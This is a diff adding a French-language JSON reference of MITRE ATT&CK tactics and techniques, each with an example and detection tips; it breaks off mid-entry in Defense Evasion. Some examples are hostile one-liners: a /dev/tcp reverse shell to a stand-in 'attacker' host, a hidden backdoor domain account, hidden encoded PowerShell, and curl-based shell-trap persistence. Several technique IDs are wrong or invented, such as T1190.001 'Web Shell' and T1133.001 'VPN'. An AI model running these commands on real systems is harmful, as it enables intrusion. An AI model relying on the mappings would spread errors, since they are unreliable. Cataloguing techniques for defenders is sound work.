@@ -1,0 +1,2226 @@
+[
+  {
+    "tactic_id": "TA0043",
+    "tactic_name": "Reconnaissance",
+    "tactic_desc": "L'adversaire recueille des informations pour planifier de futures opérations.",
+    "techniques": [
+      {
+        "id": "T1589",
+        "name": "Gather Victim Identity Information",
+        "description": "Collecte d'informations sur l'identité des victimes (noms, e-mails, rôles).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "APT28 scrape des profils LinkedIn pour identifier administrateurs.",
+        "detection": "Recherches anormales de comptes internes depuis IP externes.",
+        "url": "https://attack.mitre.org/techniques/T1589/",
+        "sub_techniques": [
+          {
+            "id": "T1589.001",
+            "name": "Credentials",
+            "description": "Collecte d'identifiants (dump de bases leakées).",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Recherche du domaine cible dans collections Combo lists.",
+            "detection": "Surveillance des achats de bases de credentials sur darkweb.",
+            "url": "https://attack.mitre.org/techniques/T1589/001/"
+          },
+          {
+            "id": "T1589.002",
+            "name": "Email Addresses",
+            "description": "Récupération d'adresses e-mail valides.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Sondage via Hunter.io / OSINT.",
+            "detection": "Anomalies de trafic vers services d'enrichissement OSINT.",
+            "url": "https://attack.mitre.org/techniques/T1589/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1590",
+        "name": "Gather Victim Network Information",
+        "description": "Collecte d'informations sur le réseau (domaines, IPs, ASN).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Scan passif via Shodan puis cartographie des sous-réseaux.",
+        "detection": "Pas de logs côté cible — détection via threat-intel et ASN monitoring.",
+        "url": "https://attack.mitre.org/techniques/T1590/",
+        "sub_techniques": [
+          {
+            "id": "T1590.005",
+            "name": "IP Addresses",
+            "description": "Liste des IPs publiques de la cible.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Résolution DNS inverse sur l'ASN ciblé.",
+            "detection": "Monitorer les résolutions PTR inhabituelles.",
+            "url": "https://attack.mitre.org/techniques/T1590/005/"
+          }
+        ]
+      },
+      {
+        "id": "T1595",
+        "name": "Active Scanning",
+        "description": "Scan actif de la cible pour découvrir services et vulnérabilités.",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Scan Nmap massif en amont d'une intrusion ransomware.",
+        "detection": "Corrélation IDS/IPS + réputation IP source.",
+        "url": "https://attack.mitre.org/techniques/T1595/",
+        "sub_techniques": [
+          {
+            "id": "T1595.002",
+            "name": "Vulnerability Scanning",
+            "description": "Recherche de CVE exposées.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Nessus / Qualys-like depuis IP hostile.",
+            "detection": "Patterns de scans réguliers depuis même source.",
+            "url": "https://attack.mitre.org/techniques/T1595/002/"
+          },
+          {
+            "id": "T1595.003",
+            "name": "Wordlist Scanning",
+            "description": "Énumération de noms/DNS via wordlists.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Subdomain brute-force avec gobuster dns.",
+            "detection": "Volume anormal de NXDOMAIN depuis une même source.",
+            "url": "https://attack.mitre.org/techniques/T1595/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1592",
+        "name": "Gather Victim Host Information",
+        "description": "Collecte d'informations sur les hôtes (hardware, software).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Identification de la version exacte d'IIS via bannières HTTP.",
+        "detection": "Peu visible — surveillance passive des job boards et fuites techniques.",
+        "url": "https://attack.mitre.org/techniques/T1592/"
+      },
+      {
+        "id": "T1596",
+        "name": "Search Open Technical Databases",
+        "description": "Recherche d'infos techniques dans bases publiques (Shodan, Censys, WHOIS).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Recherche du domaine cible sur Shodan et Censys.",
+        "detection": "Suivi via Shodan Monitor / Censys alerts.",
+        "url": "https://attack.mitre.org/techniques/T1596/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0042",
+    "tactic_name": "Resource Development",
+    "tactic_desc": "L'adversaire met en place des ressources (infrastructure, comptes, capacités).",
+    "techniques": [
+      {
+        "id": "T1583",
+        "name": "Acquire Infrastructure",
+        "description": "Achat/location d'infrastructure (domaines, VPS, bulletproof hosting).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Enregistrement de domaines typosquats et location de VPS.",
+        "detection": "WHOIS répété depuis même entité ; hébergeurs connus pour abuse.",
+        "url": "https://attack.mitre.org/techniques/T1583/",
+        "sub_techniques": [
+          {
+            "id": "T1583.001",
+            "name": "Domains",
+            "description": "Enregistrement de domaines malveillants.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Achat bulk de domaines lookalike.",
+            "detection": "Veille WHOIS + typosquat detection.",
+            "url": "https://attack.mitre.org/techniques/T1583/001/"
+          },
+          {
+            "id": "T1583.003",
+            "name": "Virtual Private Server",
+            "description": "Location de VPS.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "VPS DigitalOcean/Vultr payés en crypto.",
+            "detection": "ASN monitoring + reputation.",
+            "url": "https://attack.mitre.org/techniques/T1583/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1587",
+        "name": "Develop Capabilities",
+        "description": "Développement d'outils, malwares, certificats.",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Création de loader custom contournant EDR via LOLBAS.",
+        "detection": "Très peu de signaux — focus sur la phase d'usage en post-compromis.",
+        "url": "https://attack.mitre.org/techniques/T1587/",
+        "sub_techniques": [
+          {
+            "id": "T1587.001",
+            "name": "Malware",
+            "description": "Développement de malware custom.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Cobalt Strike customized build.",
+            "detection": "Détection au moment de l'exécution.",
+            "url": "https://attack.mitre.org/techniques/T1587/001/"
+          },
+          {
+            "id": "T1587.002",
+            "name": "Code Signing Certificates",
+            "description": "Achat/vol de certificats de signature.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Certificats signés valides obtenus via vol.",
+            "detection": "Surveillance des révocations.",
+            "url": "https://attack.mitre.org/techniques/T1587/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1588",
+        "name": "Obtain Capabilities",
+        "description": "Obtention d'outils/malwares (achat, leak, open-source).",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Achat d'un accès initial sur Genesis Market ou Russian Market.",
+        "detection": "Marketplace monitoring, threat-intel feeds spécialisés.",
+        "url": "https://attack.mitre.org/techniques/T1588/",
+        "sub_techniques": [
+          {
+            "id": "T1588.001",
+            "name": "Malware",
+            "description": "Achat de malware (Cobalt Strike, PlugX).",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Licence Cobalt Strike sur forum underground.",
+            "detection": "Hashes publics + IoC partagés.",
+            "url": "https://attack.mitre.org/techniques/T1588/001/"
+          },
+          {
+            "id": "T1588.005",
+            "name": "Exploits",
+            "description": "Achat d'exploits 0-day/n-day.",
+            "platforms": [
+              "PRE"
+            ],
+            "example": "Achat d'un RCE Citrix sur un broker.",
+            "detection": "Veille CVE + exploit broker monitoring.",
+            "url": "https://attack.mitre.org/techniques/T1588/005/"
+          }
+        ]
+      },
+      {
+        "id": "T1585",
+        "name": "Establish Accounts",
+        "description": "Création de comptes (e-mail, social, SaaS) pour l'opération.",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Création de profils LinkedIn crédibles pour le pretexting.",
+        "detection": "Anomalies de création de comptes ; OSINT pivot.",
+        "url": "https://attack.mitre.org/techniques/T1585/"
+      },
+      {
+        "id": "T1586",
+        "name": "Compromise Accounts",
+        "description": "Compromission de comptes existants pour l'opération.",
+        "platforms": [
+          "PRE"
+        ],
+        "example": "Takeover de comptes sociaux d'employés via credential stuffing.",
+        "detection": "Anomalies de connexion ; impossible-travel ; reset password non légitime.",
+        "url": "https://attack.mitre.org/techniques/T1586/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0001",
+    "tactic_name": "Initial Access",
+    "tactic_desc": "L'adversaire obtient un foothold initial dans le réseau victime.",
+    "techniques": [
+      {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "description": "Utilisation de comptes valides (volés ou existants).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS",
+          "Network",
+          "Containers"
+        ],
+        "example": "Connexion RDP avec credentials volés achetés sur Genesis Market.",
+        "detection": "Impossible-travel, MFA fatigue, connexions à heures atypiques.",
+        "url": "https://attack.mitre.org/techniques/T1078/",
+        "sub_techniques": [
+          {
+            "id": "T1078.001",
+            "name": "Default Accounts",
+            "description": "Comptes par défaut (admin/admin, sa).",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "Network"
+            ],
+            "example": "Connexion SSH avec compte 'cisco:cisco' non changé.",
+            "detection": "Inventaire de comptes par défaut.",
+            "url": "https://attack.mitre.org/techniques/T1078/001/"
+          },
+          {
+            "id": "T1078.002",
+            "name": "Domain Accounts",
+            "description": "Comptes Active Directory valides.",
+            "platforms": [
+              "Windows",
+              "SaaS"
+            ],
+            "example": "Compte 'jdoe' AD volé via stealer logs.",
+            "detection": "Kerberos pre-auth atypiques, SPN sensibles.",
+            "url": "https://attack.mitre.org/techniques/T1078/002/"
+          },
+          {
+            "id": "T1078.004",
+            "name": "Cloud Accounts",
+            "description": "Comptes cloud (Azure AD/AWS IAM).",
+            "platforms": [
+              "IaaS",
+              "SaaS"
+            ],
+            "example": "AWS access key leakée sur GitHub public.",
+            "detection": "CloudTrail anormal, console logins depuis pays inhabituels.",
+            "url": "https://attack.mitre.org/techniques/T1078/004/"
+          }
+        ]
+      },
+      {
+        "id": "T1133",
+        "name": "External Remote Services",
+        "description": "Utilisation de services distants (VPN, RDP, Citrix).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Connexion via VPN Citrix exposé sans MFA après credential stuffing.",
+        "detection": "Authentifications réussies sur VPN/Citrix à heures atypiques.",
+        "url": "https://attack.mitre.org/techniques/T1133/",
+        "sub_techniques": [
+          {
+            "id": "T1133.001",
+            "name": "VPN",
+            "description": "Connexion via concentrateur VPN.",
+            "platforms": [
+              "Network"
+            ],
+            "example": "Connexion VPN à 3h du matin depuis IP non-corporate.",
+            "detection": "Log VPN + géo-impossibility + device posture.",
+            "url": "https://attack.mitre.org/techniques/T1133/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "description": "Exploitation d'une application exposée (web, serveur mail, etc.).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "Network",
+          "Containers"
+        ],
+        "example": "Exploitation d'une RCE sur Confluence (CVE-2022-26134).",
+        "detection": "WAF logs, IDS signatures, scans de pré-exploitation corrélés.",
+        "url": "https://attack.mitre.org/techniques/T1190/",
+        "sub_techniques": [
+          {
+            "id": "T1190.001",
+            "name": "Web Shell",
+            "description": "Drop d'un web shell après RCE.",
+            "platforms": [
+              "Linux",
+              "Windows"
+            ],
+            "example": "Upload de cmd.aspx après exploitation IIS.",
+            "detection": "FIM sur webroot, scans YARA périodiques.",
+            "url": "https://attack.mitre.org/techniques/T1190/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1566",
+        "name": "Phishing",
+        "description": "Envoi de messages malveillants (lien, pièce jointe, service tiers).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "Office Suite",
+          "Identity Provider"
+        ],
+        "example": "E-mail avec lien OneDrive menant à formulaire M365 de credential harvesting.",
+        "detection": "DMARC failure, sandbox URL detonation, signalements utilisateurs.",
+        "url": "https://attack.mitre.org/techniques/T1566/",
+        "sub_techniques": [
+          {
+            "id": "T1566.001",
+            "name": "Spearphishing Attachment",
+            "description": "Pièce jointe malveillante ciblée.",
+            "platforms": [
+              "Windows",
+              "macOS"
+            ],
+            "example": "Document Word avec macro droppant IcedID.",
+            "detection": "Mark-of-the-Web contourné, sandbox macro, AMSI sur Office.",
+            "url": "https://attack.mitre.org/techniques/T1566/001/"
+          },
+          {
+            "id": "T1566.002",
+            "name": "Spearphishing Link",
+            "description": "Lien dans e-mail ciblé.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Lien vers fake-login M365 sur infrastructure bulletproof.",
+            "detection": "URL inspection + browser isolation.",
+            "url": "https://attack.mitre.org/techniques/T1566/002/"
+          },
+          {
+            "id": "T1566.003",
+            "name": "Spearphishing via Service",
+            "description": "Phishing via plateforme tierce (Slack, Teams).",
+            "platforms": [
+              "SaaS",
+              "Office Suite"
+            ],
+            "example": "Message Teams 'urgent invoice'.",
+            "detection": "Slack/Teams DLP, anomaly detection.",
+            "url": "https://attack.mitre.org/techniques/T1566/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1199",
+        "name": "Trusted Relationship",
+        "description": "Exploitation de relations de confiance (partenaire, MSP).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS"
+        ],
+        "example": "Compromission d'un MSP ayant accès RDP à plusieurs clients.",
+        "detection": "Anomalies sur les accès délégués, MFA sur tier-1 vendors.",
+        "url": "https://attack.mitre.org/techniques/T1199/"
+      },
+      {
+        "id": "T1659",
+        "name": "Content Injection",
+        "description": "Injection de contenu malveillant dans services (annonces, DNS, MITM).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "Network"
+        ],
+        "example": "Injection de scripts via ad-network compromise.",
+        "detection": "Anomalies de contenu servi, SRI/CSP violation.",
+        "url": "https://attack.mitre.org/techniques/T1659/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0002",
+    "tactic_name": "Execution",
+    "tactic_desc": "L'adversaire exécute du code malveillant sur le système local ou distant.",
+    "techniques": [
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "description": "Abus d'interpréteurs (PowerShell, cmd, bash, Python…).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "PowerShell encodé Base64 exécutant un stager Cobalt Strike.",
+        "detection": "AMSI, Script Block Logging, EDR user-mode hooks.",
+        "url": "https://attack.mitre.org/techniques/T1059/",
+        "sub_techniques": [
+          {
+            "id": "T1059.001",
+            "name": "PowerShell",
+            "description": "Abus de PowerShell.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "powershell -enc <b64> -nop -w hidden.",
+            "detection": "ScriptBlock logging 4104, AMSI 4103.",
+            "url": "https://attack.mitre.org/techniques/T1059/001/"
+          },
+          {
+            "id": "T1059.003",
+            "name": "Windows Command Shell",
+            "description": "Abus de cmd.exe.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "cmd /c whoami & net user & ipconfig via LOLBAS.",
+            "detection": "Sysmon 1, command-line auditing.",
+            "url": "https://attack.mitre.org/techniques/T1059/003/"
+          },
+          {
+            "id": "T1059.004",
+            "name": "Unix Shell",
+            "description": "Abus de bash/sh.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "bash -i >& /dev/tcp/attacker/443 0>&1.",
+            "detection": "Auditd execve, audit de /dev/tcp.",
+            "url": "https://attack.mitre.org/techniques/T1059/004/"
+          },
+          {
+            "id": "T1059.006",
+            "name": "Python",
+            "description": "Abus de Python.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "python -c 'import socket...'.",
+            "detection": "EDR python module anomaly.",
+            "url": "https://attack.mitre.org/techniques/T1059/006/"
+          }
+        ]
+      },
+      {
+        "id": "T1106",
+        "name": "Native API",
+        "description": "Exécution directe via appels d'API natifs.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Process injection via CreateRemoteThread + VirtualAllocEx.",
+        "detection": "Sysmon 8/10, ETW, EDR kernel callbacks.",
+        "url": "https://attack.mitre.org/techniques/T1106/"
+      },
+      {
+        "id": "T1053",
+        "name": "Scheduled Task/Job",
+        "description": "Création de tâches planifiées pour exécution persistante.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "Containers"
+        ],
+        "example": "Tâche via schtasks /create /sc minute pour le beacon.",
+        "detection": "Sysmon 1 sur schtasks.exe, audit 4698, cron monitoring.",
+        "url": "https://attack.mitre.org/techniques/T1053/",
+        "sub_techniques": [
+          {
+            "id": "T1053.005",
+            "name": "Scheduled Task",
+            "description": "Tâche planifiée Windows.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "schtasks /create /tn Updater /tr 'cmd /c ...'.",
+            "detection": "Event 4698/4699, attributs suspects.",
+            "url": "https://attack.mitre.org/techniques/T1053/005/"
+          },
+          {
+            "id": "T1053.003",
+            "name": "Cron",
+            "description": "Tâche cron Unix.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "*/5 * * * * /tmp/.x/.a via crontab.",
+            "detection": "Audit /var/spool/cron + auditd.",
+            "url": "https://attack.mitre.org/techniques/T1053/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "description": "Exécution via WMI (local ou distant).",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "wmic /node:SRV process call create 'cmd.exe'.",
+        "detection": "Sysmon WMI event 19, ETW WMI-Activity.",
+        "url": "https://attack.mitre.org/techniques/T1047/"
+      },
+      {
+        "id": "T1204",
+        "name": "User Execution",
+        "description": "L'adversaire trompe l'utilisateur pour exécuter du code.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Utilisateur ouvre un .lnk malveillant reçu par phishing.",
+        "detection": "Mark-of-the-Web, AMSI/EDR au click, sandbox user init.",
+        "url": "https://attack.mitre.org/techniques/T1204/",
+        "sub_techniques": [
+          {
+            "id": "T1204.002",
+            "name": "Malicious File",
+            "description": "Fichier malveillant exécuté.",
+            "platforms": [
+              "Windows",
+              "macOS",
+              "Linux"
+            ],
+            "example": "Ouverture d'un PDF droppant Cobalt Strike.",
+            "detection": "EDR file-write + child-of-Office chain.",
+            "url": "https://attack.mitre.org/techniques/T1204/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1129",
+        "name": "Shared Modules",
+        "description": "Chargement de modules partagés (.so/.dll).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Chargement d'une DLL malveillante via LoadLibrary.",
+        "detection": "Sysmon 7/11, ETW image load, EDR module load hooks.",
+        "url": "https://attack.mitre.org/techniques/T1129/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0003",
+    "tactic_name": "Persistence",
+    "tactic_desc": "L'adversaire maintient son foothold malgré redémarrages.",
+    "techniques": [
+      {
+        "id": "T1098",
+        "name": "Account Manipulation",
+        "description": "Manipulation de comptes (ajout credentials, permissions).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS",
+          "Network",
+          "Containers"
+        ],
+        "example": "Set-ADAccountPassword -Reset sur compte admin.",
+        "detection": "Event 4724/4738 AD, CloudTrail IAM change.",
+        "url": "https://attack.mitre.org/techniques/T1098/",
+        "sub_techniques": [
+          {
+            "id": "T1098.001",
+            "name": "Additional Cloud Credentials",
+            "description": "Ajout de clés cloud.",
+            "platforms": [
+              "IaaS",
+              "SaaS"
+            ],
+            "example": "Ajout d'AWS AccessKey à un rôle IAM.",
+            "detection": "CloudTrail anomalie key age.",
+            "url": "https://attack.mitre.org/techniques/T1098/001/"
+          },
+          {
+            "id": "T1098.003",
+            "name": "Additional Mailbox Permissions",
+            "description": "Ajout de droits sur boîtes mail.",
+            "platforms": [
+              "SaaS",
+              "Office Suite"
+            ],
+            "example": "FullAccess ajouté sur boîtes de dirigeants.",
+            "detection": "M365 audit FullAccessAdded.",
+            "url": "https://attack.mitre.org/techniques/T1098/003/"
+          }
+        ]
+      },
+      {
+        "id": "T1136",
+        "name": "Create Account",
+        "description": "Création de comptes (local, domaine, cloud).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS",
+          "Containers"
+        ],
+        "example": "net user backdoor$ P@ssw0rd! /add /domain.",
+        "detection": "Event 4720, CloudTrail IAM CreateUser.",
+        "url": "https://attack.mitre.org/techniques/T1136/",
+        "sub_techniques": [
+          {
+            "id": "T1136.001",
+            "name": "Local Account",
+            "description": "Création de compte local.",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS"
+            ],
+            "example": "Net user admin2 ... /add local.",
+            "detection": "Event 4720 + Sysmon.",
+            "url": "https://attack.mitre.org/techniques/T1136/001/"
+          },
+          {
+            "id": "T1136.002",
+            "name": "Domain Account",
+            "description": "Création de compte domaine.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "New-ADUser -Name svc_backup.",
+            "detection": "Event 4720, UAC flag.",
+            "url": "https://attack.mitre.org/techniques/T1136/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1543",
+        "name": "Create or Modify System Process",
+        "description": "Création/modification de services (Windows service, systemd).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Création d'un service 'W32TimeHelper' pointant sur powershell.",
+        "detection": "Sysmon 1/13, Event 4697, audit systemd.",
+        "url": "https://attack.mitre.org/techniques/T1543/",
+        "sub_techniques": [
+          {
+            "id": "T1543.003",
+            "name": "Windows Service",
+            "description": "Service Windows persistant.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "sc.exe create W32Time binPath= 'cmd /c ...'.",
+            "detection": "Event 4697 + service path anomalous.",
+            "url": "https://attack.mitre.org/techniques/T1543/003/"
+          },
+          {
+            "id": "T1543.002",
+            "name": "Systemd Service",
+            "description": "Service systemd persistant.",
+            "platforms": [
+              "Linux"
+            ],
+            "example": "systemd unit malveillant activé.",
+            "detection": "Audit systemd unit + FIM.",
+            "url": "https://attack.mitre.org/techniques/T1543/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1547",
+        "name": "Boot or Logon Autostart Execution",
+        "description": "Exécution auto au boot/logon (Run keys, LaunchAgents).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "HKCU\\...\\Run\\Updater = powershell.exe -w hidden.",
+        "detection": "Sysmon 13, audit StartupItems, FIM profile.d.",
+        "url": "https://attack.mitre.org/techniques/T1547/",
+        "sub_techniques": [
+          {
+            "id": "T1547.001",
+            "name": "Registry Run Keys / Startup Folder",
+            "description": "Persistance via Run/Startup.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "HKCU\\...\\Run\\Updater.",
+            "detection": "Sysmon 13 + baseline.",
+            "url": "https://attack.mitre.org/techniques/T1547/001/"
+          },
+          {
+            "id": "T1547.004",
+            "name": "Launch Agents",
+            "description": "LaunchAgent macOS.",
+            "platforms": [
+              "macOS"
+            ],
+            "example": "~/Library/LaunchAgents/com.user.agent.plist.",
+            "detection": "FIM + audit plist.",
+            "url": "https://attack.mitre.org/techniques/T1547/004/"
+          },
+          {
+            "id": "T1547.005",
+            "name": "Security Support Provider",
+            "description": "Abus SSP DLL.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Installation de mimilib.dll comme SSP.",
+            "detection": "Sysmon 7/11, audit LSA.",
+            "url": "https://attack.mitre.org/techniques/T1547/005/"
+          }
+        ]
+      },
+      {
+        "id": "T1546",
+        "name": "Event Triggered Execution",
+        "description": "Exécution déclenchée par événements (WMI, trap shell).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "WMI EventConsumer + EventFilter sur timer.",
+        "detection": "WMI Activity log, audit udev, Sysmon.",
+        "url": "https://attack.mitre.org/techniques/T1546/",
+        "sub_techniques": [
+          {
+            "id": "T1546.008",
+            "name": "Trap",
+            "description": "Trap shell signal handler.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "trap 'curl ...' EXIT ajouté à .bashrc.",
+            "detection": "Audit .bashrc + auditd.",
+            "url": "https://attack.mitre.org/techniques/T1546/008/"
+          },
+          {
+            "id": "T1546.001",
+            "name": "Change Default File Association",
+            "description": "Hijack d'association de fichiers.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Modification de HKCR\\.txt.",
+            "detection": "FIM sur HKCR.",
+            "url": "https://attack.mitre.org/techniques/T1546/001/"
+          }
+        ]
+      },
+      {
+        "id": "T1554",
+        "name": "Compromise Client Software Binary",
+        "description": "Compromission de binaires clients (WinSCP, PuTTY).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Backdoor de WinSCP.exe pour exfiltrer credentials.",
+        "detection": "Hash checking, signature validation, EDR.",
+        "url": "https://attack.mitre.org/techniques/T1554/"
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0004",
+    "tactic_name": "Privilege Escalation",
+    "tactic_desc": "L'adversaire obtient des privilèges plus élevés (root, SYSTEM, admin).",
+    "techniques": [
+      {
+        "id": "T1068",
+        "name": "Exploitation for Privilege Escalation",
+        "description": "Exploitation de vulnérabilité logicielle pour élever les privilèges.",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Exploitation de CVE-2021-3156 (Baron Samedit) sur sudo.",
+        "detection": "EDR kernel hooks, exploit mitigation, crashdump anomaly.",
+        "url": "https://attack.mitre.org/techniques/T1068/"
+      },
+      {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism",
+        "description": "Abus de mécanismes d'élévation (UAC bypass, sudo caching).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "Bypass UAC via fodhelper.exe + hijack HKCU.",
+        "detection": "Sysmon 1 sur fodhelper, audit sudoers.",
+        "url": "https://attack.mitre.org/techniques/T1548/",
+        "sub_techniques": [
+          {
+            "id": "T1548.002",
+            "name": "Bypass User Account Control",
+            "description": "Contournement UAC.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "fodhelper.exe + HKCU\\...\\shell\\open\\command.",
+            "detection": "Event 4624 + integrity level Medium→High.",
+            "url": "https://attack.mitre.org/techniques/T1548/002/"
+          },
+          {
+            "id": "T1548.003",
+            "name": "Sudo and Sudo Caching",
+            "description": "Abus de sudo caching.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "sudo -l puis réutilisation timestamp cached.",
+            "detection": "Audit /var/log/auth.log + sudoers.",
+            "url": "https://attack.mitre.org/techniques/T1548/003/"
+          },
+          {
+            "id": "T1548.004",
+            "name": "Elevated Execution with Prompt",
+            "description": "Exécution avec prompt consent.",
+            "platforms": [
+              "macOS"
+            ],
+            "example": "osascript with administrator privileges.",
+            "detection": "macOS TCC logs.",
+            "url": "https://attack.mitre.org/techniques/T1548/004/"
+          }
+        ]
+      },
+      {
+        "id": "T1134",
+        "name": "Access Token Manipulation",
+        "description": "Manipulation de tokens (steal, impersonate).",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "SeDebugPrivilege + DuplicateToken.",
+        "detection": "Sysmon token events, ETW TokenRight, EDR.",
+        "url": "https://attack.mitre.org/techniques/T1134/",
+        "sub_techniques": [
+          {
+            "id": "T1134.001",
+            "name": "Token Impersonation/Theft",
+            "description": "Vol de token.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Impersonation via Incognito/mimikatz.",
+            "detection": "Event 4624 logon type anomalies.",
+            "url": "https://attack.mitre.org/techniques/T1134/001/"
+          },
+          {
+            "id": "T1134.002",
+            "name": "Create Process with Token",
+            "description": "Process créé avec token volé.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "CreateProcessAsUserA avec token SYSTEM.",
+            "detection": "Sysmon 1 token correlation.",
+            "url": "https://attack.mitre.org/techniques/T1134/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1574",
+        "name": "Hijack Execution Flow",
+        "description": "Hijack de flux d'exécution (DLL search order, PATH).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS"
+        ],
+        "example": "DLL hijacking sur programme auto-élevé.",
+        "detection": "Sysmon 7, ETW image load, FIM.",
+        "url": "https://attack.mitre.org/techniques/T1574/",
+        "sub_techniques": [
+          {
+            "id": "T1574.002",
+            "name": "DLL Side-Loading",
+            "description": "DLL side-loading via signed binary.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "Side-load d'une DLL via binaire signé.",
+            "detection": "Sysmon 7 + signature validation.",
+            "url": "https://attack.mitre.org/techniques/T1574/002/"
+          },
+          {
+            "id": "T1574.006",
+            "name": "Dynamic Linker Hijacking",
+            "description": "LD_PRELOAD / RPATH hijack.",
+            "platforms": [
+              "Linux",
+              "macOS"
+            ],
+            "example": "LD_PRELOAD malveillant.",
+            "detection": "Audit LD_PRELOAD, /etc/ld.so.preload.",
+            "url": "https://attack.mitre.org/techniques/T1574/006/"
+          }
+        ]
+      },
+      {
+        "id": "T1546",
+        "name": "Event Triggered Execution (escalation)",
+        "description": "Déclenchement d'exécution via IFEO ou WMI pour escalade.",
+        "platforms": [
+          "Windows"
+        ],
+        "example": "IFEO Debugger hijack sur sethc.exe → utilman.",
+        "detection": "Sysmon + FIM IFEO + WMI activity.",
+        "url": "https://attack.mitre.org/techniques/T1546/",
+        "sub_techniques": [
+          {
+            "id": "T1546.012",
+            "name": "Image File Execution Options Injection",
+            "description": "IFEO Debugger hijack.",
+            "platforms": [
+              "Windows"
+            ],
+            "example": "HKLM\\...\\Image File Execution Options\\sethc.exe\\Debugger.",
+            "detection": "FIM IFEO + Sysmon 13.",
+            "url": "https://attack.mitre.org/techniques/T1546/012/"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "tactic_id": "TA0005",
+    "tactic_name": "Defense Evasion",
+    "tactic_desc": "L'adversaire évite la détection par les défenses.",
+    "techniques": [
+      {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "description": "Activités malveillantes réalisées avec compte légitime.",
+        "platforms": [
+          "Windows",
